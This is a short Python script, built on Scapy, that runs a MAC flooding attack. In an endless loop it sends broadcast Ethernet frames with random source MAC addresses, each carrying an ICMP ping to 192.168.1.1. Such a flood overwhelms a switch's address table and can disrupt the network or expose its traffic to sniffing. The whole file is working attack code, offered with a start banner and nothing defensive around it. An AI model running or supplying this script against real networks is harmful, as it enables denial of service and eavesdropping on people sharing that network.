from scapy.all import Ether, IP, ICMP, sendp
import random
import time

target_interface = "eth0"  # adjust for interface (e.g., eth0, en0, wlan0)

def random_mac():
    return ":".join(f"{random.randint(0x00, 0xff):02x}" for _ in range(6))

def mac_flood():
    while True:
        # generate random source MAC address and use broadcast destination MAC tp all
        src_mac = random_mac()
        dst_mac = "ff:ff:ff:ff:ff:ff"  # braoacast to all devices

        # create and send the packet
        # use Ether layer for Ethernet frame, IP for network layer, and ICMP for ping
        pkt = Ether(src=src_mac, dst=dst_mac) / IP(dst="192.168.1.1") / ICMP()
        sendp(pkt, iface=target_interface, verbose=0)

try:
    print("[*] Starting MAC flood... press Ctrl+C to stop.")
    mac_flood()
except KeyboardInterrupt:
    print("[!] Flooding stopped.")
